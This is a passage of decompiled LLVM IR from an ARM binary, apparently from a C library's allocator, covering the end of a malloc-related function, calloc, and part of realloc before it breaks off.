dec_label_pc_1233c:                               ; preds = %dec_label_pc_11a9c, %dec_label_pc_12320
  %v0_1233c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1233c, i32* %r0.global-to-local, align 4
  store i32 %v3_11a38, i32* @r4, align 4
  store i32 %v6_11a38, i32* @r5, align 4
  store i32 %v9_11a38, i32* @r6, align 4
  store i32 %v12_11a38, i32* @r7, align 4
  store i32 %v15_11a38, i32* @r8, align 4
  store i32 %v18_11a38, i32* @sb, align 4
  store i32 %v21_11a38, i32* @sl, align 4
  store i32 %v24_11a38, i32* @fp, align 4
  store i32 %v27_11a38, i32* @lr, align 4
  ret i32 %v0_1233c

; uselistorder directives
  uselistorder i32 %v0_122e0, { 1, 0, 2 }
  uselistorder i32 %v3_122c8, { 1, 0, 2, 3 }
  uselistorder i32 %v4_122c4, { 1, 0 }
  uselistorder i32 %v2_122a8, { 2, 0, 1, 3 }
  uselistorder i32 %v4_122a0, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_12258, { 1, 2, 0 }
  uselistorder i32 %v0_12220, { 1, 0 }
  uselistorder i32 %v0_12214, { 1, 0 }
  uselistorder i32 %v2_12204, { 1, 0 }
  uselistorder i32 %v2_12194, { 2, 1, 0 }
  uselistorder i32 %v2_1217c, { 1, 2, 0, 3 }
  uselistorder i32 %v2_12174, { 1, 0, 2 }
  uselistorder i32 %v1_12170, { 2, 1, 0 }
  uselistorder i32 %v0_12170, { 3, 1, 2, 0 }
  uselistorder i32 %v1_12154, { 1, 0 }
  uselistorder i32 %v2_1212c, { 1, 0 }
  uselistorder i32 %v3_12120, { 1, 0, 2 }
  uselistorder i32 %v2_12100, { 1, 0, 2 }
  uselistorder i32* %v2_120f8, { 1, 0, 2 }
  uselistorder i32 %v0_120e0, { 1, 0 }
  uselistorder i32 %v6_120bc, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_120a8, { 2, 1, 0 }
  uselistorder i32 %v0_12090, { 1, 0 }
  uselistorder i32 %v2_1204c, { 1, 0, 2, 3 }
  uselistorder i32 %v1_12048, { 1, 0 }
  uselistorder i32 %v3_12020, { 0, 3, 1, 2, 4, 5 }
  uselistorder i32 %v2_12000, { 1, 0, 2 }
  uselistorder i32 %v2_11fe8, { 1, 2, 0, 3 }
  uselistorder i32 %v1_11f90, { 2, 1, 0 }
  uselistorder i32 %v6_11f84, { 3, 4, 2, 1, 0, 5 }
  uselistorder i32 %v3_11f60, { 2, 1, 0, 3 }
  uselistorder i32 %v3_11f20, { 1, 0, 2, 3 }
  uselistorder i32 %v0_11ee0, { 5, 6, 7, 0, 1, 8, 3, 2, 4, 9 }
  uselistorder i32 %v3_11ed8, { 1, 0, 2, 3 }
  uselistorder i32 %v4_11ed4, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32 %v0_11ec0, { 1, 0 }
  uselistorder i32 %v7_11e80, { 1, 0 }
  uselistorder i32 %v4_11e80, { 1, 0 }
  uselistorder i32 %v0_11e50, { 1, 0 }
  uselistorder i32 %v2_11e24, { 3, 2, 1, 0 }
  uselistorder i32 %ip.promoted, { 2, 0, 1 }
  uselistorder i32 %v0_11e2054, { 1, 0 }
  uselistorder i32 %v1_11dec, { 1, 2, 0, 4, 3 }
  uselistorder i32 %v1_11dd4., { 1, 2, 0 }
  uselistorder i32 %v0_11ddc, { 0, 1, 3, 2 }
  uselistorder i32 %v1_11ddc, { 1, 0 }
  uselistorder i32 %v3_11dbc, { 1, 0 }
  uselistorder i32 %v4_11db8, { 1, 0, 2 }
  uselistorder i32 %v1_11d28, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_11d80, { 1, 0 }
  uselistorder i32 %v1_11d64, { 1, 0 }
  uselistorder i32 %v1_11c04, { 1, 0 }
  uselistorder i32 %v0_11d44, { 2, 0, 1, 3 }
  uselistorder i32 %v3_11d0c, { 2, 0, 1, 3 }
  uselistorder i32 %v0_11da0.pre, { 1, 2, 0 }
  uselistorder i32 %v0_11ce8, { 2, 1, 0 }
  uselistorder i32 %v3_11cdc, { 5, 6, 4, 3, 2, 0, 1 }
  uselistorder i32 %v0_11bfc, { 0, 5, 4, 3, 1, 2 }
  uselistorder i32 %v1_11ca4, { 1, 0 }
  uselistorder i32 %v3_11c98, { 1, 0 }
  uselistorder i32 %v0_11ca4, { 1, 0 }
  uselistorder i32 %v3_11c7c, { 0, 2, 3, 1 }
  uselistorder i32 %v2_11c6c, { 1, 0, 2 }
  uselistorder i32 %v3_11c24, { 2, 1, 0 }
  uselistorder i32 %v0_11c14, { 3, 2, 1, 0 }
  uselistorder i32 %v0_11be4, { 1, 0 }
  uselistorder i32 %v1_11b98, { 2, 1, 0, 3 }
  uselistorder i32 %v0_11b94, { 4, 2, 1, 3, 0 }
  uselistorder i32 %v3_11b38, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v3_11b2c, { 1, 0 }
  uselistorder i32 %v3_11afc, { 1, 0 }
  uselistorder i32 %v0_11af0, { 5, 6, 4, 2, 0, 3, 1 }
  uselistorder i32 %v2_11ad0, { 0, 2, 1, 3 }
  uselistorder i1 %v7_11ac4, { 1, 0 }
  uselistorder i32 %v0_11a94, { 1, 0 }
  uselistorder i32* %r8.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r5.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r4.global-to-local, { 13, 0, 1, 2, 3, 4, 6, 5, 8, 9, 7, 10, 11, 12, 14, 15, 16 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 42, 39, 40, 41, 43, 44, 45, 46, 109, 110, 47, 48, 49, 50, 51, 52, 53, 54, 55, 60, 56, 57, 58, 59, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 80, 88, 75, 76, 77, 78, 79, 81, 82, 83, 84, 108, 85, 86, 87, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 32, 31, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 51, 44, 45, 46, 47, 48, 49, 50, 52, 53, 54, 55, 56, 57, 58, 59, 60 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 19, 18, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 46, 41, 42, 43, 44, 45, 47, 48, 49, 50, 51, 52, 53 }
  uselistorder i32* %r0.global-to-local, { 4, 2, 30, 3, 5, 6, 7, 19, 11, 8, 20, 9, 10, 13, 12, 17, 14, 21, 16, 15, 22, 18, 26, 24, 23, 25, 28, 27, 31, 29, 36, 32, 33, 1, 34, 35, 37, 38, 39, 42, 43, 40, 41, 48, 45, 44, 46, 47, 49, 54, 50, 51, 52, 53, 56, 55, 59, 58, 57, 0 }
  uselistorder i32* %lr.global-to-local, { 0, 1, 2, 3, 4, 7, 5, 6, 8, 9, 10, 11, 12, 13 }
  uselistorder i32* %ip.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 11, 10, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 0, 23, 24, 36, 35, 28, 25, 1, 26, 27, 29, 30, 31, 32, 33, 34, 37, 38, 39, 40, 41, 42 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @mmap, { 1, 0 }
  uselistorder i32 (i32)* @__malloc_largebin_index, { 1, 0 }
  uselistorder label %dec_label_pc_1233c, { 1, 0 }
  uselistorder label %dec_label_pc_12320, { 7, 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %dec_label_pc_1231c, { 4, 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_12304, { 1, 2, 0 }
  uselistorder label %bb168, { 1, 0 }
  uselistorder label %bb166, { 1, 0 }
  uselistorder label %dec_label_pc_12298, { 4, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_12214, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_1220c, { 1, 0 }
  uselistorder label %bb164, { 1, 0 }
  uselistorder label %.thread44, { 1, 0 }
  uselistorder label %.thread43, { 1, 0 }
  uselistorder label %.thread40, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_120e0, { 1, 0 }
  uselistorder label %.thread32, { 1, 0 }
  uselistorder label %bb157, { 1, 0 }
  uselistorder label %bb153, { 1, 0 }
  uselistorder label %dec_label_pc_12014, { 2, 0, 3, 1 }
  uselistorder label %bb150, { 1, 0 }
  uselistorder label %bb148, { 1, 0 }
  uselistorder label %.thread27, { 1, 0 }
  uselistorder label %dec_label_pc_11ecc, { 0, 2, 1 }
  uselistorder label %.thread121, { 1, 0 }
  uselistorder label %bb144, { 1, 0 }
  uselistorder label %dec_label_pc_11e20, { 1, 0 }
  uselistorder label %dec_label_pc_11e28.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_11dec, { 1, 0 }
  uselistorder label %dec_label_pc_11da0, { 1, 0 }
  uselistorder label %dec_label_pc_11d34, { 1, 0 }
  uselistorder label %dec_label_pc_11d30, { 1, 0 }
  uselistorder label %dec_label_pc_11cdc, { 1, 0 }
  uselistorder label %dec_label_pc_11cc8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11c90, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_11c7c, { 1, 0 }
  uselistorder label %bb140, { 1, 0 }
  uselistorder label %bb138, { 1, 0 }
}

define i32 @function_12350(i32 %arg1) local_unnamed_addr {
dec_label_pc_12350:
  %v0_12350 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_12350, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_12350
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_12350, %bb
  %v4_1236c = phi i32 [ %arg1, %dec_label_pc_12350 ], [ 0, %bb ]
  ret i32 %v4_1236c

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @calloc(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %v3_12370 = load i32, i32* @r4, align 4
  %v6_12370 = load i32, i32* @r5, align 4
  %v9_12370 = load i32, i32* @r6, align 4
  %v12_12370 = load i32, i32* @lr, align 4
  %v2_12378 = icmp eq i32 %arg1, 0
  store i32 ptrtoint (i32* @global_var_21694.308 to i32), i32* @r5, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %v2_12388 = mul i32 %arg2, %arg1
  store i32 %v2_12388, i32* @r6, align 4
  br i1 %v2_12378, label %dec_label_pc_123c0, label %dec_label_pc_12390

dec_label_pc_12390:                               ; preds = %entry
  store i32 %arg1, i32* @r1, align 4
  %v2_12398 = udiv i32 %v2_12388, %arg1
  %v9_1239c = icmp eq i32 %v2_12398, %arg2
  br i1 %v9_1239c, label %dec_label_pc_123c0, label %dec_label_pc_123a4

dec_label_pc_123a4:                               ; preds = %dec_label_pc_12390
  %v0_123a8 = call i32 @__aeabi_read_tp()
  %v3_123ac = load i16, i16* @global_var_216ec.303, align 2
  %v4_123ac = sext i16 %v3_123ac to i32
  store i32 0, i32* %r4.global-to-local, align 4
  %v3_123b8 = add i32 %v4_123ac, %v0_123a8
  %v4_123b8 = inttoptr i32 %v3_123b8 to i32*
  store i32 12, i32* %v4_123b8, align 4
  br label %dec_label_pc_12484

dec_label_pc_123c0:                               ; preds = %dec_label_pc_12390, %entry
  %v4_123c4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21694.308 to i32), i32 108) to i32*), align 4
  store i32 %v4_123c4, i32* @r4, align 4
  %v4_123dc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21694.308 to i32), i32 112) to i32*), align 4
  store i32 %v4_123dc, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_123dc)
  %v0_123f0 = load i32, i32* @r5, align 4
  %v2_123f0 = add i32 %v0_123f0, 16
  %v3_123f0 = inttoptr i32 %v2_123f0 to i32*
  %v4_123f0 = load i32, i32* %v3_123f0, align 4
  store i32 %v4_123f0, i32* %ip.global-to-local, align 4
  store i32 74748, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_123f0)
  %v0_123fc = load i32, i32* @r6, align 4
  %v1_12400 = call i32 @malloc(i32 %v0_123fc)
  store i32 %v1_12400, i32* %r4.global-to-local, align 4
  %v2_12404 = icmp eq i32 %v1_12400, 0
  br i1 %v2_12404, label %.thread, label %dec_label_pc_1240c

dec_label_pc_1240c:                               ; preds = %dec_label_pc_123c0
  %v1_1240c = add i32 %v1_12400, -4
  %v2_1240c = inttoptr i32 %v1_1240c to i32*
  %v3_1240c = load i32, i32* %v2_1240c, align 4
  %v1_12410 = and i32 %v3_1240c, 2
  %v2_12410 = icmp eq i32 %v1_12410, 0
  br i1 %v2_12410, label %dec_label_pc_12418, label %.thread

dec_label_pc_12418:                               ; preds = %dec_label_pc_1240c
  %v1_124186 = add i32 %v3_1240c, -4
  %v1_1241c = and i32 %v1_124186, -4
  %v3_12420 = udiv i32 %v1_1241c, 4
  store i32 %v3_12420, i32* %ip.global-to-local, align 4
  %tmp = icmp eq i32 %v1_1241c, 36
  %v2_12428 = icmp ult i32 %v1_1241c, 33
  %v3_12428 = or i1 %tmp, %v2_12428
  br i1 %v3_12428, label %dec_label_pc_12434, label %dec_label_pc_1242c

dec_label_pc_1242c:                               ; preds = %dec_label_pc_12418
  %v3_1242c = inttoptr i32 %v1_12400 to i8*
  %v4_1242c = call i32 @__GI_memset(i8* %v3_1242c, i32 0, i32 %v1_1241c)
  br label %.thread

dec_label_pc_12434:                               ; preds = %dec_label_pc_12418
  %tmp7 = icmp eq i32 %v1_1241c, 16
  %v2_12438 = inttoptr i32 %v1_12400 to i32*
  store i32 0, i32* %v2_12438, align 4
  %v1_1243c = load i32, i32* %r4.global-to-local, align 4
  %v2_1243c = add i32 %v1_1243c, 4
  %v3_1243c = inttoptr i32 %v2_1243c to i32*
  store i32 0, i32* %v3_1243c, align 4
  %v1_12440 = load i32, i32* %r4.global-to-local, align 4
  %v2_12440 = add i32 %v1_12440, 8
  %v3_12440 = inttoptr i32 %v2_12440 to i32*
  store i32 0, i32* %v3_12440, align 4
  %v2_12444 = icmp ult i32 %v1_1241c, 13
  %v3_12444 = or i1 %tmp7, %v2_12444
  br i1 %v3_12444, label %.thread, label %dec_label_pc_12448

dec_label_pc_12448:                               ; preds = %dec_label_pc_12434
  %v0_12448 = load i32, i32* %ip.global-to-local, align 4
  %v1_1244c = load i32, i32* %r4.global-to-local, align 4
  %v2_1244c = add i32 %v1_1244c, 12
  %v3_1244c = inttoptr i32 %v2_1244c to i32*
  store i32 0, i32* %v3_1244c, align 4
  %v1_12450 = load i32, i32* %r4.global-to-local, align 4
  %v2_12450 = add i32 %v1_12450, 16
  %v3_12450 = inttoptr i32 %v2_12450 to i32*
  store i32 0, i32* %v3_12450, align 4
  %tmp8 = icmp ult i32 %v0_12448, 7
  br i1 %tmp8, label %.thread, label %dec_label_pc_12458

dec_label_pc_12458:                               ; preds = %dec_label_pc_12448
  %v0_12458 = load i32, i32* %ip.global-to-local, align 4
  %v7_12458 = icmp eq i32 %v0_12458, 9
  %v1_1245c = load i32, i32* %r4.global-to-local, align 4
  %v2_1245c = add i32 %v1_1245c, 20
  %v3_1245c = inttoptr i32 %v2_1245c to i32*
  store i32 0, i32* %v3_1245c, align 4
  %v1_12460 = load i32, i32* %r4.global-to-local, align 4
  %v2_12460 = add i32 %v1_12460, 24
  %v3_12460 = inttoptr i32 %v2_12460 to i32*
  store i32 0, i32* %v3_12460, align 4
  br i1 %v7_12458, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_12458
  %v2_12464 = load i32, i32* %r4.global-to-local, align 4
  %v3_12464 = add i32 %v2_12464, 32
  %v4_12464 = inttoptr i32 %v3_12464 to i32*
  store i32 0, i32* %v4_12464, align 4
  %v2_12468 = load i32, i32* %r4.global-to-local, align 4
  %v3_12468 = add i32 %v2_12468, 28
  %v4_12468 = inttoptr i32 %v3_12468 to i32*
  store i32 0, i32* %v4_12468, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_12458, %dec_label_pc_1240c, %dec_label_pc_12448, %dec_label_pc_12434, %dec_label_pc_123c0, %dec_label_pc_1242c, %bb
  store i32 1, i32* @r1, align 4
  %v0_12478 = load i32, i32* @r5, align 4
  %v2_12478 = add i32 %v0_12478, 44
  %v3_12478 = inttoptr i32 %v2_12478 to i32*
  %v4_12478 = load i32, i32* %v3_12478, align 4
  store i32 %v4_12478, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_12478)
  br label %dec_label_pc_12484

dec_label_pc_12484:                               ; preds = %dec_label_pc_123a4, %.thread
  %v0_12484 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v3_12370, i32* @r4, align 4
  store i32 %v6_12370, i32* @r5, align 4
  store i32 %v9_12370, i32* @r6, align 4
  store i32 %v12_12370, i32* @lr, align 4
  ret i32 %v0_12484

; uselistorder directives
  uselistorder i32 %v1_1241c, { 0, 5, 2, 1, 4, 3 }
  uselistorder i32 %v1_12400, { 0, 2, 1, 3, 4 }
  uselistorder i32* %r4.global-to-local, { 9, 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 11 }
  uselistorder i32 33, { 0, 5, 1, 2, 3, 4 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_12484, { 1, 0 }
  uselistorder label %.thread, { 6, 0, 2, 3, 5, 1, 4 }
}

define i32 @function_1249c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1249c:
  %v0_1249c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1249c, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_1249c
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_1249c, %bb
  %v4_124ac = phi i32 [ %arg1, %dec_label_pc_1249c ], [ 0, %bb ]
  ret i32 %v4_124ac

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @realloc(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_124b0 = load i32, i32* @r4, align 4
  %v6_124b0 = load i32, i32* @r5, align 4
  %v9_124b0 = load i32, i32* @r6, align 4
  %v12_124b0 = load i32, i32* @r7, align 4
  %v15_124b0 = load i32, i32* @r8, align 4
  %v18_124b0 = load i32, i32* @sb, align 4
  %v21_124b0 = load i32, i32* @sl, align 4
  %v24_124b0 = load i32, i32* @fp, align 4
  %v27_124b0 = load i32, i32* @lr, align 4
  store i32 %tmp, i32* @r5, align 4
  %v2_124bc = icmp eq i32* %arg1, null
  store i32 ptrtoint (i32* @global_var_21694.308 to i32), i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* @r6, align 4
  br i1 %v2_124bc, label %dec_label_pc_124d0, label %dec_label_pc_124e0

dec_label_pc_124d0:                               ; preds = %entry
  store i32 %arg2, i32* %r0.global-to-local, align 4
  %v1_124d4 = call i32 @malloc(i32 %arg2)
  store i32 %v1_124d4, i32* %r0.global-to-local, align 4
  store i32 %v1_124d4, i32* @r4, align 4
  br label %dec_label_pc_12840

dec_label_pc_124e0:                               ; preds = %entry
  %v2_124e0 = icmp eq i32 %arg2, 0
  br i1 %v2_124e0, label %dec_label_pc_124e8, label %dec_label_pc_124f4

dec_label_pc_124e8:                               ; preds = %dec_label_pc_124e0
  %v0_124e8 = call i32 @free()
  store i32 %v0_124e8, i32* %r0.global-to-local, align 4
  %v0_124ec = load i32, i32* @r6, align 4
  store i32 %v0_124ec, i32* @r4, align 4
  br label %dec_label_pc_12840

dec_label_pc_124f4:                               ; preds = %dec_label_pc_124e0
  store i32 108, i32* %r3.global-to-local, align 4
  %v4_124fc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21694.308 to i32), i32 108) to i32*), align 4
  store i32 %v4_124fc, i32* @r4, align 4
  store i32 68, i32* %r3.global-to-local, align 4
  store i32 %v4_124fc, i32* %r2.global-to-local, align 4
  %v4_12508 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21694.308 to i32), i32 68) to i32*), align 4
  store i32 %v4_12508, i32* %r1.global-to-local, align 4
  %v2_1250c = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_1250c, i32* %r0.global-to-local, align 4
  store i32 112, i32* %r3.global-to-local, align 4
  %v4_12514 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21694.308 to i32), i32 112) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_12514)
  %v0_12520 = load i32, i32* @r4, align 4
  store i32 %v0_12520, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_21694.308 to i32), i32* %r1.global-to-local, align 4
  %v4_1252c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21694.308 to i32), i32 16) to i32*), align 4
  store i32 ptrtoint (i32* @global_var_12538.412 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_1252c)
  %v0_12538 = load i32, i32* @r6, align 4
  %tmp36 = icmp ult i32 %v0_12538, -32
  br i1 %tmp36, label %dec_label_pc_1255c, label %dec_label_pc_12540

dec_label_pc_12540:                               ; preds = %dec_label_pc_124f4
  store i32 61852, i32* %r2.global-to-local, align 4
  %v0_12544 = call i32 @__aeabi_read_tp()
  store i32 %v0_12544, i32* %r0.global-to-local, align 4
  %v3_12548 = load i16, i16* @global_var_216ec.303, align 2
  %v4_12548 = sext i16 %v3_12548 to i32
  store i32 %v4_12548, i32* %r2.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v3_12554 = add i32 %v4_12548, %v0_12544
  %v4_12554 = inttoptr i32 %v3_12554 to i32*
  store i32 12, i32* %v4_12554, align 4
  br label %dec_label_pc_12840

dec_label_pc_1255c:                               ; preds = %dec_label_pc_124f4
  %v1_1255c = add i32 %v0_12538, 11
  store i32 %v1_1255c, i32* %r0.global-to-local, align 4
  %v0_12560 = load i32, i32* @r5, align 4
  %v1_12560 = add i32 %v0_12560, -4
  %v2_12560 = inttoptr i32 %v1_12560 to i32*
  %v3_12560 = load i32, i32* %v2_12560, align 4
  store i32 %v3_12560, i32* %r2.global-to-local, align 4
  %v2_12564 = icmp ugt i32 %v1_1255c, 14
  %v7_12564 = icmp eq i32 %v1_1255c, 15
  %v2_12568 = xor i1 %v2_12564, true
  %v3_12568 = or i1 %v7_12564, %v2_12568
  br i1 %v3_12568, label %bb, label %bb27

bb:                                               ; preds = %dec_label_pc_1255c
  store i32 16, i32* @sb, align 4
  br label %bb27

bb27:                                             ; preds = %dec_label_pc_1255c, %bb
  %v2_1256c = xor i1 %v7_12564, true
  %v3_1256c = and i1 %v2_12564, %v2_1256c
  br i1 %v3_1256c, label %bb28, label %bb29

bb28:                                             ; preds = %bb27
  %v5_1256c = and i32 %v1_1255c, -8
  store i32 %v5_1256c, i32* @sb, align 4
  br label %bb29

bb29:                                             ; preds = %bb27, %bb28
  %v1_12570 = and i32 %v3_12560, 2
  %v2_12570 = icmp eq i32 %v1_12570, 0
  %v1_12574 = add i32 %v0_12560, -8
  store i32 %v1_12574, i32* @sl, align 4
  %v1_12578 = and i32 %v3_12560, -4
  store i32 %v1_12578, i32* @r6, align 4
  br i1 %v2_12570, label %dec_label_pc_12580, label %dec_label_pc_12758

dec_label_pc_12580:                               ; preds = %bb29
  %v1_12580 = load i32, i32* @sb, align 4
  %v3_12580 = icmp ult i32 %v1_12578, %v1_12580
  br i1 %v3_12580, label %dec_label_pc_1258c, label %bb30

bb30:                                             ; preds = %dec_label_pc_12580
  store i32 %v1_12578, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_126f0

dec_label_pc_1258c:                               ; preds = %dec_label_pc_12580
  store i32 64, i32* %r3.global-to-local, align 4
  %v4_12594 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21694.308 to i32), i32 64) to i32*), align 4
  store i32 %v4_12594, i32* %r0.global-to-local, align 4
  %v1_12598 = add i32 %v4_12594, 44
  %v2_12598 = inttoptr i32 %v1_12598 to i32*
  %v3_12598 = load i32, i32* %v2_12598, align 4
  store i32 %v3_12598, i32* %r3.global-to-local, align 4
  %v2_1259c = add i32 %v1_12578, %v1_12574
  store i32 %v2_1259c, i32* @r4, align 4
  %v9_125a0 = icmp eq i32 %v2_1259c, %v3_12598
  %v1_125a4 = add i32 %v2_1259c, 4
  %v2_125a4 = inttoptr i32 %v1_125a4 to i32*
  %v3_125a4 = load i32, i32* %v2_125a4, align 4
  store i32 %v3_125a4, i32* %r1.global-to-local, align 4
  br i1 %v9_125a0, label %dec_label_pc_125ac, label %dec_label_pc_125e8

dec_label_pc_125ac:                               ; preds = %dec_label_pc_1258c
  %v1_125ac = and i32 %v3_125a4, -4
  %v2_125b0 = add i32 %v1_125ac, %v1_12578
  store i32 %v2_125b0, i32* %r1.global-to-local, align 4
  %v1_125b4 = add i32 %v1_12580, 16
  store i32 %v1_125b4, i32* %r3.global-to-local, align 4
  %v3_125b8 = icmp ult i32 %v2_125b0, %v1_125b4
  br i1 %v3_125b8, label %dec_label_pc_1263c, label %dec_label_pc_125c0

dec_label_pc_125c0:                               ; preds = %dec_label_pc_125ac
  %v2_125c0 = sub i32 %v2_125b0, %v1_12580
  %v1_125c4 = urem i32 %v3_12560, 2
  %v2_125c8 = add i32 %v1_12580, %v1_12574
  store i32 %v2_125c8, i32* %r1.global-to-local, align 4
  %v2_125cc = or i32 %v1_12580, %v1_125c4
  store i32 %v2_125cc, i32* %r2.global-to-local, align 4
  %v1_125d0 = or i32 %v2_125c0, 1
  store i32 %v1_125d0, i32* %r3.global-to-local, align 4
  store i32 %v0_12560, i32* @r4, align 4
  store i32 %v2_125cc, i32* %v2_12560, align 4
  %v0_125dc = load i32, i32* %r1.global-to-local, align 4
  %v1_125dc = load i32, i32* %r0.global-to-local, align 4
  %v2_125dc = add i32 %v1_125dc, 44
  %v3_125dc = inttoptr i32 %v2_125dc to i32*
  store i32 %v0_125dc, i32* %v3_125dc, align 4
  %v0_125e0 = load i32, i32* %r3.global-to-local, align 4
  %v1_125e0 = load i32, i32* %r1.global-to-local, align 4
  %v2_125e0 = add i32 %v1_125e0, 4
  %v3_125e0 = inttoptr i32 %v2_125e0 to i32*
  store i32 %v0_125e0, i32* %v3_125e0, align 4
  br label %dec_label_pc_12824

dec_label_pc_125e8:                               ; preds = %dec_label_pc_1258c
  %v1_125e8 = and i32 %v3_125a4, -2
  %v2_125ec = add i32 %v1_125e8, %v2_1259c
  store i32 %v2_125ec, i32* %r3.global-to-local, align 4
  %v1_125f0 = add i32 %v2_125ec, 4
  %v2_125f0 = inttoptr i32 %v1_125f0 to i32*
  %v3_125f0 = load i32, i32* %v2_125f0, align 4
  store i32 %v3_125f0, i32* %r3.global-to-local, align 4
  %v1_125f4 = urem i32 %v3_125f0, 2
  %v2_125f4 = icmp eq i32 %v1_125f4, 0
  br i1 %v2_125f4, label %dec_label_pc_125fc, label %dec_label_pc_1263c

dec_label_pc_125fc:                               ; preds = %dec_label_pc_125e8
  %v1_125fc = and i32 %v3_125a4, -4
  store i32 %v1_125fc, i32* %r3.global-to-local, align 4
  %v2_12600 = add i32 %v1_125fc, %v1_12578
  store i32 %v2_12600, i32* %r0.global-to-local, align 4
  %v3_12604 = icmp ult i32 %v2_12600, %v1_12580
  br i1 %v3_12604, label %dec_label_pc_1263c, label %dec_label_pc_1260c

dec_label_pc_1260c:                               ; preds = %dec_label_pc_125fc
  %v1_1260c = add i32 %v1_12578, %v0_12560
  %v2_1260c = inttoptr i32 %v1_1260c to i32*
  %v3_1260c = load i32, i32* %v2_1260c, align 4
  store i32 %v3_1260c, i32* %r1.global-to-local, align 4
  %v1_12610 = add i32 %v3_1260c, 12
  %v2_12610 = inttoptr i32 %v1_12610 to i32*
  %v3_12610 = load i32, i32* %v2_12610, align 4
  store i32 %v3_12610, i32* %r3.global-to-local, align 4
  %v9_12614 = icmp eq i32 %v3_12610, %v2_1259c
  %v1_12618 = add i32 %v2_1259c, 12
  %v2_12618 = inttoptr i32 %v1_12618 to i32*
  %v3_12618 = load i32, i32* %v2_12618, align 4
  store i32 %v3_12618, i32* %r2.global-to-local, align 4
  br i1 %v9_12614, label %dec_label_pc_12620, label %dec_label_pc_1262c

dec_label_pc_12620:                               ; preds = %dec_label_pc_1260c
  %v1_12620 = add i32 %v3_12618, 8
  %v2_12620 = inttoptr i32 %v1_12620 to i32*
  %v3_12620 = load i32, i32* %v2_12620, align 4
  store i32 %v3_12620, i32* %r3.global-to-local, align 4
  %v9_12624 = icmp eq i32 %v3_12620, %v2_1259c
